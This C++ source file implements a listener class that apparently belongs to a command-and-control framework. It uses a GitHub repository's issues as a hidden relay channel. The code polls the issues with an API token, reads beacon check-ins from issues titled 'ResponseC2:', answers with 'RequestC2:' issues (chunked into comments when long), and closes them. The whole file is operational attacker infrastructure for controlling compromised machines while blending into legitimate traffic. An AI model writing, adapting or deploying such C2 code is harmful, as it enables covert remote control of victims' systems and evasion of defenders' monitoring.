#include "ListenerGithub.hpp"


using namespace std;
using namespace httplib;


ListenerGithub::ListenerGithub(const std::string& project, const std::string& token)
	: Listener("127.0.0.1", 911, ListenerGithubType)
	, m_project(project)
	, m_token(token)
{	
	m_listenerHash = random_string(SizeListenerHash);
	m_listenerHash += "-";
	m_listenerHash += ListenerGithubType;
	m_listenerHash += "/";
	m_listenerHash += project;

	m_isRunning=true;
	this->m_githubFetcher = std::make_unique<std::thread>(&ListenerGithub::checkGithubIssues, this);
}


ListenerGithub::~ListenerGithub()
{
	m_isRunning=false;
	m_githubFetcher->join();
}


void ListenerGithub::checkGithubIssues()
{
	while(m_isRunning)
	{
		std::string url = "https://api.github.com";
		httplib::Client cli(url);

		std::string token = "token ";
		token+=m_token;

		httplib::Headers headers = {
			{ "Accept", "application/vnd.github+json" },
			{ "Authorization", token },
			{ "Cookie", "logged_in=no" }
		};

		// get list of issues
		std::string endpoint = "/repos/";
		endpoint += m_project;	
		endpoint += "/issues";	
		auto response = cli.Get(endpoint, headers);

		std::cout << "response->status " << response->status << std::endl;

		if(response->status!=200 && response->status!=201)
		{
			DEBUG("Error with the ListenerGithub: " << response->body);
			continue;
		}

		if(!response->body.empty())
		{
			json my_json = json::parse(response->body);

			// for every issue in the list
			for (json::iterator it = my_json.begin(); it != my_json.end(); ++it)
			{				
				std::string title = (*it)["title"];
				std::string body = (*it)["body"];
				int number = (*it)["number"];
				int nbComments = (*it)["comments"];

				// TODO handle big response with multiple comments
				if(nbComments!=0)
				{
					std::cout << "Issue with comments: " << std::to_string(number) << std::endl;;
				}

				DEBUG("[+] handle issue: " << std::to_string(number));

				if(title.rfind("ResponseC2: ", 0) == 0)
				{	
					std::string marker = "ResponseC2: ";
					std::size_t pos = title.find(marker);
					if (pos == std::string::npos) 
					{
						continue;
					}
					pos += marker.length();
					std::string beaconHash = title.substr(pos);

					std::string res;
					HandleCheckIn(body, res);

					// generate the response for response who got content 
					if(res.size()>4)
					{
						std::string reponseTitle = "RequestC2: ";   
						reponseTitle+=beaconHash;

						// body too long need to split it
						int maxChunkSize = 65000;
						if(res.size()>=maxChunkSize)
						{
							DEBUG("Split response");
							std::vector<std::string> chunks;
							for (std::size_t i = 0; i < res.size(); i += maxChunkSize) 
							{
								chunks.push_back(res.substr(i, maxChunkSize));
							}

							std::cout << "Split response of " << chunks.size() << " chunks" << std::endl;

							json responseData = {
							{"title", reponseTitle},
							{"body", chunks[0]},
							};

							std::string data = responseData.dump();

							std::string contentType = "application/json";
							auto response = cli.Post(endpoint, headers, data, contentType);

							std::cout << "Issue created " << response->status << std::endl;
							
							if(response->status!=200 && response->status!=201)
							{
								DEBUG("Error with the ListenerGithub: " << response->body);
								continue;
							}

							json my_json = json::parse(response->body);
							int number = my_json["number"];
		
							for (std::size_t i = 1; i < chunks.size(); i++) 
							{
								json responseData = {
									{"body", chunks[i]},
									};

								std::string data = responseData.dump();

								std::string contentType = "application/json";
								std::string issueEndpoint = "/repos/";
								issueEndpoint += m_project;	
								issueEndpoint += "/issues/";
								issueEndpoint += std::to_string(number);	
								issueEndpoint += "/comments";
								auto response = cli.Post(issueEndpoint, headers, data, contentType);

								std::cout << "Comments created " << response->status << std::endl;

								if(response->status!=200 && response->status!=201)
								{
									std::cout << "Comments error " << response->body << std::endl;

									DEBUG("Error with the ListenerGithub: " << response->body);
									continue;
								}
							}
						}
						else
						{
							DEBUG("Simple reponse");

							json responseData = {
							{"title", reponseTitle},
							{"body", res},
							};

							std::string data = responseData.dump();

							std::string contentType = "application/json";
							auto response = cli.Post(endpoint, headers, data, contentType);

							if(response->status!=200 && response->status!=201)
							{
								DEBUG("Error with the ListenerGithub: " << response->body);
								continue;
							}
						}
					}

					std::string data = "{\"state\":\"closed\"}";
					std::string contentType = "application/json";

					// close the issue
					std::string issueEndpoint = "/repos/";
					issueEndpoint += m_project;	
					issueEndpoint += "/issues/";
					issueEndpoint += std::to_string(number);	
					auto response = cli.Post(issueEndpoint, headers, data, contentType);
				}
			}
		}	

		std::this_thread::sleep_for(std::chrono::milliseconds(1000));
	}
}


int ListenerGithub::HandleCheckIn(const std::string& req, std::string& output)
{
	bool ret = handleMessages(req, output);

	DEBUG("output.size " << std::to_string(output.size()));

	return 0;
}
